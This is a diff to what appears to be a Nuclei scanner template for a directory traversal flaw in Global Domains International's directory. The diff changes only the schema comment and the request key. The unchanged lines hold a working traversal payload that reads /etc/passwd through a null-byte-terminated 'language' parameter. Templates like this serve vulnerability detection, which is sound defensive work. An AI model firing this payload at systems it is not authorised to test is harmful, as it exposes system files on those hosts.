@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: global-domains-lfi
 info:
   name: Global Domains International Directory traversal Vulnerability
@@ -7,7 +8,7 @@ info:
     - https://cxsecurity.com/issue/WLB-2018020247
     - http://www.nic.ws
   tags: globaldomains,lfi,traversal
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11"
